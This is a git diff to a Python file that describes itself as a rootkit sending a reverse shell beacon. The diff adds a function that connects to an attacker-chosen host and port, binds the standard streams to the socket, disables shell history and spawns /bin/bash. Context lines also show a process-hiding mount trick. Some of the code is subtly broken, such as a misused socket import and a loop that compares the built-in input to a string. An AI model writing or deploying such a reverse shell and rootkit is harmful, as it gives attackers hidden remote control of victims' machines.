@@ -1,9 +1,10 @@
 from subprocess import Popen, PIPE
 from socket import socket
 from string import ascii_letters, digits
-from os import getpid
+from os import getpid, dup2, putenv
 from random import choice
 from time import sleep
+from pty import spawn
 
 """
 rootkit to install on client and sends a reverse shell beacon
@@ -23,3 +24,14 @@ def PROC_HIDE_CMD(): return f'mount -o {TMP_DIR} /proc/{pid}'
 while True:
     if input == "exit":
         break
+
+
+def shell(lhost, lport):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((lhost, lport))
+    dup2(s.fileno(), 0)
+    dup2(s.fileno(), 1)
+    dup2(s.fileno(), 2)
+    putenv("HISTFILE", '/dev/null')
+    spawn("/bin/bash")
+    s.close()
